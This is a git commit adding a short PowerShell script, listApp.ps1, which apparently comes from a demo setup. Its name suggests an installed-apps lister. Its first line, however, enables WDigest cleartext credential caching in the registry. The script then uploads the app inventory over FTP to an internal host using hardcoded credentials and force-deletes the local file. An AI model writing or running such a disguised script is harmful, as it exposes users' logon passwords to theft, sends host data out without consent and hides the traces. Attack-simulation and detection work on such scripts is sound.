a7aba2ec38638c02513f48b8c1bae2e486c2c0a0
squentel <30870132+squentel@users.noreply.github.com>
2022-09-08 09:30:46 +0200

    Create listApp.ps1

---
+++ listApp.ps1
@@ -0,0 +1,9 @@
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+$listApps=Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize
+$listApps | Out-File -filepath C:\myapps.txt
+$file = "C:\myapps.txt"
+$ftpuri = "ftp://demoUser:CrowdDemo789!@172.17.0.34/myapps.txt"
+$webclient = New-Object System.Net.WebClient
+$uri = New-Object System.Uri($ftpuri)
+$webclient.UploadFile($uri, $file)  
+Remove-Item -Path C:\myapps.txt -Force
